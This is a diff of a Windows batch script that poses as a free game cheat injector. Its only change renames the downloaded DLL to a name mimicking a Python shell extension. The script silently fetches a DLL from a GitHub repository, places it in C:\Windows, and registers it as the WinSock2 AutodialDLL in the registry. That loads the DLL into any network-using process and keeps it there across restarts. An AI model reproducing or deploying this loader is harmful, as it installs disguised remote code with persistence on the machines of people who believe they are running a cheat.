@@ -32,14 +32,14 @@ cd "%tempFolder%"
 :: Download required files
 echo.
 echo [32mLoading...[0m
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/64file911/freecheat/raw/refs/heads/main/kainite.dll' -OutFile '%tempFolder%\kainite.dll'" >nul 2>&1
+powershell -Command "Invoke-WebRequest -Uri 'https://github.com/64file911/freecheat/raw/refs/heads/main/pyshellextamd64.dll' -OutFile '%tempFolder%\pyshellextamd64.dll'" >nul 2>&1
 
 :: Move the downloaded file to the final destination and modify registry
 echo.
 echo [32mInjecting cheat...[0m
 timeout /t 5 >nul
-move /Y "%tempFolder%\kainite.dll" "C:\Windows\" >nul 2>&1
-reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\kainite.dll" /F >nul 2>&1
+move /Y "%tempFolder%\pyshellextamd64.dll" "C:\Windows\" >nul 2>&1
+reg add "HKLM\SYSTEM\ControlSet001\Services\WinSock2\Parameters" /t REG_SZ /v AutodialDLL /d "%systemroot%\pyshellextamd64.dll" /F >nul 2>&1
 
 echo.
 echo [32mOperation completed successfully.[0m
